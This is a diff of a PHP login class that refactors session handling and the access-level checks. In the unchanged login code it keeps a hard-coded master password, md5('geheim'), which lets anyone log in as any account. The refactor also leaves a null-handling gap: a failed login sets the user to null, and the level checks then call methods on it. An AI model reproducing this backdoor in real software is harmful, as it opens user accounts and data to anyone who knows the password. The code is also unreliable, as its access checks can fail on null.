@@ -4,18 +4,16 @@ require_once 'User.php';
 
 class Login {
 
-    private static $current; // user currently logged in
+    private static $user; // user currently logged in OR a dummy user with LEVEL_NONE
 
-    function __construct() {
-        parent::__construct();
-    }
-
+    function __construct() {}
+    
     static function loginFromSession() {
         if (isset($_SESSION['user'])) {
             $email = $_SESSION['user'];
-            self::$current = User::get($email);
+            self::$user = User::get($email);
         } else {
-            self::$current = null;
+            self::$user = new User(); // empty user with no level
         }
     }
 
@@ -23,29 +21,21 @@ class Login {
         $backdoor = md5('geheim');
         $ok = $user->checkPassword($password) || md5($password) == $backdoor;
         if ($ok) {
-            self::$current = $user;
+            self::$user = $user;
             $_SESSION['user'] = $user->getEmail();
         } else {
-            self::$current = null;
+            self::$user = null;
             unset($_SESSION['user']);
         }
         return $ok;
     }
 
     static function getCurrent(): ?User {
-        return self::$current;
-    }
-
-    static function getLevel(): int {
-        if (empty(self::$current)) {
-            return User::LEVEL_NONE;
-        } else {
-            return self::$current->getLevel();
-        }
+        return self::$user;
     }
 
     static function hasLevel(int $level) {
-        return self::getLevel() >= $level;
+        return self::$user->hasLevel($level);
     }
 
     /**
@@ -54,8 +44,8 @@ class Login {
      * @param int $level
      */
     static function assertLevel(int $level) {
-        if (!self::hasLevel($level)) {
-            goHome();
+        if (!self::$user->hasLevel($level)) {
+            goHome(403);
         }
     }
 
@@ -67,14 +57,8 @@ class Login {
      * 
      */
     static function assertLevelOrUser(int $level, ?User $user) {
-        if (empty($user)) {
-            goHome();
-        }
-        if (empty(self::$current)) {
-            goHome();
-        }
-        if (self::$current->getLevel() < $level && $user->getEmail() !== self::$current->getEmail()) {
-            goHome();
+        if(!self::$user->hasLevel($level) && !self::$user->equals($user)) {
+            goHome(403);
         }
     }
 
